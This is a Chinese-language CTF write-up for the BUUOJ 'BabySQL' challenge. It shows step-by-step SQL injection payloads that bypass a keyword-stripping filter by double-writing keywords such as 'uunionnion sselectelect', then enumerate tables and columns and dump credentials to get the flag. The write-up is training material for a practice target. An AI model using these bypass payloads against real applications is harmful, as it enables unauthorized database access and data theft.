+<h1 id="T8-极客大挑战-2019-BabySQL"><a href="#T8-极客大挑战-2019-BabySQL" class="headerlink" title="T8 [极客大挑战 2019]BabySQL"></a>T8 [极客大挑战 2019]BabySQL</h1><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]BabySQL">题目地址</a></p>
+<p>尝试万能密码<code>1&#39; or 1=1#</code>登录无果，应该是对一些字符进行了过滤，可以用FUZZ测试。这里直接手测一下，用<code>1&#39; order by 3#</code>试一试</p>
+<img src="/2023/01/04/%E9%9B%86%E8%AE%ADWriteUp-1/test8.png" class="" title="测试">
+
+<p>结果只剩下<code>der 3#</code>了，过滤掉了<code>or</code>和<code>by</code>（应该是用replace替换掉了），继续测试，发现<code>union</code>和<code>select</code>也被过滤。这里用<strong>双写绕过</strong>：</p>
+<p>爆字段数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; oorrder bbyy 4#                  //测试为4时报错，故字段数为3</span><br></pre></td></tr></table></figure>
+
+<p>爆回显位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; uunionnion sselectelect 1,2,3#   //2, 3为回显位</span><br></pre></td></tr></table></figure>
+
+<p>爆表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; uunionnion sselectelect 1,2,(group_concat(table_name))ffromrom(infoorrmation_schema.tables)wwherehere(table_schema=database())#</span><br></pre></td></tr></table></figure>
+<p><code>from, where</code>同样用双写绕过。另外注意<code>inforrmation</code>含有<code>or</code>，也需要作绕过处理。最终得到<code>b4bsql,geekuser</code>两个表。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; uunionnion sselectelect 1,2,(group_concat(column_name))ffromrom(infoorrmation_schema.columns)wwherehere(table_name=&#x27;b4bsql&#x27;)#</span><br></pre></td></tr></table></figure>
+<p>爆字段名，得到<code>id,username,password</code>三个字段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; uunionnion sselectelect 1,2,group_concat(id,username,passwoorrd) ffromrom b4bsql#</span><br></pre></td></tr></table></figure>
+<p>爆数据，注意成功password中的<code>or</code>绕过，成功拿到flag.</p>
 
         </div>
 
